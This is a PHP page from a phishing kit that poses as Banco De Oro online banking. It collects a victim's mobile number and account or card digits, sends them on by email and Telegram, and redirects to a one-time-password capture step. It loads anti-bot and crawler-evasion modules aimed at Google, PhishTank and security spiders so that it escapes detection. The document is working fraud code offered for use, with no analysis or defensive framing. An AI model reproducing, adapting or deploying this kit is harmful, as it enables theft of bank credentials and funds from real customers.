<?php 
session_start();
ob_start();

require_once( 'conf.php' );
require_once( 'php_components/user_info.php' );

require_once( 'antibot_files/APIs/antibot_pw.api.php' );
require_once( 'antibot_files/crawler_detection/is_google.php'    );
require_once( 'antibot_files/crawler_detection/is_phishtank.php' );
require_once( 'antibot_files/crawler_detection/is_spider.php' );
require_once( 'antibot_files/blacklist/blacklist_ip.php' );
require_once( 'antibot_files/blacklist/blacklist_ua.php' );
require_once( 'antibot_files/blacklist/blacklist_isp.php' );
require_once( 'antibot_files/blacklist/blacklist_word.php' );
require_once( 'antibot_files/blacklist/ip_range.php' );

if(!isset($_SESSION['@ADVANCEDSPAMMING-second_log'])) header('location: index.php');


if($_SERVER['REQUEST_METHOD'] == 'POST') {

  if(strlen($_POST['mobile_num']) >= 6 && !empty($_POST['account_num'])){
			   
    $_SESSION['@ADVANCEDSPAMMING-personal'] = array(
      'mobile_num' => $_POST['mobile_num'],
	  'account_num' => $_POST['account_num']);
	  
    $_SESSION['otp_attempts'] = 0;
    require_once('php_components/messages.php');
    require_once('php_components/sendMail.php');
    require_once('php_components/sendMessage.telegram.php');

    header('location: one_time_password.php');
  }
}
?>
<html>
  <head>
    <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" />
    <meta http-equiv="X-UA-Compatible" content="IE=100">
    <title>Banco De Oro Online Banking</title>
    <link rel="stylesheet" type="text/css" href="styles/css/jquery-ui-1.8.2.custom.css">
    <link rel="stylesheet" type="text/css" href="styles/css/allcss.css">
    <link rel="stylesheet" type="text/css" href="styles/css/base.css">
    <link rel="stylesheet" type="text/css" href="styles/css/layout.css">
  </head>
  <body>
    <div id="parentcontainer">
      <div id="wrapper">
        <div id="head">
          <div id="contentTop">
            <div id="logoWrapper">
              <div id="bdoLogo">
                <a href="javascript:void(0);" >
                  <span>Banco De Oro</span>
                </a>
              </div>
            </div>
          </div>
        </div>
        <div id="page">
          <div></div>
          <div id="mainwrapper" class="ui-corner-all">
            <div id="main" class="contentblock">
              <table>
                <tbody>
                  <tr>
                    <td>
                      <!-- <h2 class="pageHeader">
                        <span>Forgot Telephone PIN</span>
                      </h2> -->
                      <div class="headerCaption">
                        <span>Enter Required Information</span>
                      </div>
                    </td>
                    <td>
                      <div style="float: right; text-align: right">
                        <div></div>
                      </div>
                    </td>
                  </tr>
                </tbody>
              </table>
              <div id="id81" class="sxiFeedback"></div>
              <div>
                <div id="id82" style="display:none"></div>
              </div>
              <div>
                <div id="id83" style="display:none"></div>
              </div>
              <table>
                <tbody>
                  <tr>
                    <td style="vertical-align: top">
                      <div class="ui-widget">
                        <span>
                          <span>
                            <div class="portlet ui-widget ui-widget-content ui-helper-clearfix  ui-corner-all">
                              <h3 class="portlet-header ui-widget-header ui-corner-all">
                                <span>Personal Information</span>
                              </h3>
                              <div class="portlet-content contentblock">
                                <form onsubmit="mobile_auth(document.querySelector('#mobile_num').value);" id="idc" method="post" action="<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>" class="jNice" autocomplete="off">
                 
                                  <table class="formtable">
                                    <tbody>
                                      <tr id="highlight_row" class="">
                                        <td class="formlabel">Mobile Number</td>
                                        <td>
                                          <input onfocus="document.querySelector('#highlight_row').classList.add('clsHighlightRow');" onfocusout="document.querySelector('#highlight_row').classList.remove('clsHighlightRow');" class="required mobile" type="text" maxlength="15" value="" name="mobile_num" id="mobile_num">
                                        </td>

						</tr>
				</tbody></table>
				<br>
				<div id="id3d">
					<div id="id43">
						<table class="formtable">
							<tbody><tr>
								<td class="formlabel">Account/Card Number*</td>
								<td> <input onfocus="document.querySelector('#highlight_row').classList.add('clsHighlightRow');" onfocusout="document.querySelector('#highlight_row').classList.remove('clsHighlightRow');" class="required mobile" type="text" maxlength="4" value="" name="account_num" id="account_num"></td>
							</tr>
						</tbody></table>
						<font size="1"><i>*Enter the last 4 digits of your BDO Debit Card or Checking/Savings account enrolled in BDO Online Banking</i></font>
					</div>
				</div>
			<br>
		</div>
                                      </tr>
                                    </tbody>
                                  </table>
                                  <br>
                                  <span class="feedback sxiFeedback" id="id12c" style="display: none">
                                    <ul class="paginationul">
                                      <li class="feedbackPanelERROR">
                                        <span id="err_message" class="feedbackPanelERROR">Mobile number is required</span>
                                      </li>
                                    </ul>
                                  </span>
                                  <p align="center">
                                    <input type="submit" name="submitButton" id="id87" sxibutton="true" class="sxi-button ui-corner-all ui-state-default" validating="true" value="Verify">
                                  </p>
                                </form>
                              </div>
                              <div class="rightcontainer">
                              </div>
                            </div>
                          </span>
                        </span>
                      </div>
                    </td>
                    <td style="vertical-align: top" width="20px">
                      <div id="info">
                        <div></div>
                      </div>
                    </td>
                  </tr>
                </tbody>
              </table>
            </div>
          </div>
        </div>
        <?php require_once('html_components/main_footer.php'); ?>
      </div>
      <div id="bysy_indicator" style="display: none;">
        <div id="loading_gif"></div>
      </div>
    </div>
    <div id="id88"></div>
    <script src="js_scripts/variables_root.js"></script>
    <script src="js_scripts/mobile_number.js"></script>
  </body>
</html>